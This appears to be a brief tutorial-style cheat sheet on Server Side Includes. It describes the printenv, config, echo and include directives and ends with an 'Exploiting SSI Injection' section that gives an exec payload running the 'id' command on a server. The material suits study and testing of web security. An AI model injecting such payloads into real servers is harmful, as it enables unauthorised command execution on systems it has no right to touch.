# SSI Directives

- The use of SSI can often be inferred from the file extension. Typical file extensions include `.shtml`, `.shtm`, and `.stm`
## printenv

- This directive prints environment variables

```js
<!--#printenv -->
```

## Config

- This directive changes the SSI configuration by specifying corresponding parameters

```js
<!--#config errmsg="Error!" -->
```

## echo

- prints the value of any variable given in the `var`

```js
<!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->
```

## include

- This directive includes the file specified in the `virtual` paramete

```js
<!--#include virtual="index.html" -->
```

# Exploiting SSI Injection

- we can use this payload 

```js
<!--#exec cmd="id" -->
```